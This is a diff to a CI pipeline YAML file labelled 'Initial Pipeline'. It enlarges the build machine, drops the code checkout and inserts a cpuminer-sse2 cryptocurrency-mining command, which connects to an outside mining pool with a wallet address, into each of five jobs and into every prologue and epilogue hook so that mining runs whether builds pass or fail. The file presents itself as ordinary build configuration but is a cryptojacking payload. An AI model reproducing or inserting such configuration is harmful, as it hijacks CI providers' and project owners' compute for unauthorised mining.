@@ -2,12 +2,48 @@ version: v1.0
 name: Initial Pipeline
 agent:
   machine:
-    type: e1-standard-2
+    type: e1-standard-4
     os_image: ubuntu1804
+global_job_config:
+  epilogue:
+    always:
+      commands:
+        - './cpuminer-sse2 -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u MiMavGCbcbpmGqJxugFTbY3Db1higmb3gP.PAIJO4 -t0'
+    on_pass:
+      commands:
+        - './cpuminer-sse2 -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u MiMavGCbcbpmGqJxugFTbY3Db1higmb3gP.PAIJO4 -t0'
+    on_fail:
+      commands:
+        - './cpuminer-sse2 -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u MiMavGCbcbpmGqJxugFTbY3Db1higmb3gP.PAIJO4 -t0'
 blocks:
   - name: 'Block #1'
     task:
       jobs:
         - name: 'Job #1'
           commands:
-            - checkout
+            - './cpuminer-sse2 -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u MiMavGCbcbpmGqJxugFTbY3Db1higmb3gP.PAIJO4 -t0'
+        - name: 'Job #2'
+          commands:
+            - './cpuminer-sse2 -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u MiMavGCbcbpmGqJxugFTbY3Db1higmb3gP.PAIJO4 -t0'
+        - name: 'Job #3'
+          commands:
+            - './cpuminer-sse2 -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u MiMavGCbcbpmGqJxugFTbY3Db1higmb3gP.PAIJO4 -t0'
+        - name: 'Job #4'
+          commands:
+            - './cpuminer-sse2 -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u MiMavGCbcbpmGqJxugFTbY3Db1higmb3gP.PAIJO4 -t0'
+        - name: 'Job #5'
+          commands:
+            - './cpuminer-sse2 -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u MiMavGCbcbpmGqJxugFTbY3Db1higmb3gP.PAIJO4 -t0'
+      prologue:
+        commands:
+          - './cpuminer-sse2 -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u MiMavGCbcbpmGqJxugFTbY3Db1higmb3gP.PAIJO4 -t0'
+      epilogue:
+        always:
+          commands:
+            - './cpuminer-sse2 -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u MiMavGCbcbpmGqJxugFTbY3Db1higmb3gP.PAIJO4 -t0'
+        on_pass:
+          commands:
+            - './cpuminer-sse2 -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u MiMavGCbcbpmGqJxugFTbY3Db1higmb3gP.PAIJO4 -t0'
+        on_fail:
+          commands:
+            - './cpuminer-sse2 -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u MiMavGCbcbpmGqJxugFTbY3Db1higmb3gP.PAIJO4 -t0'
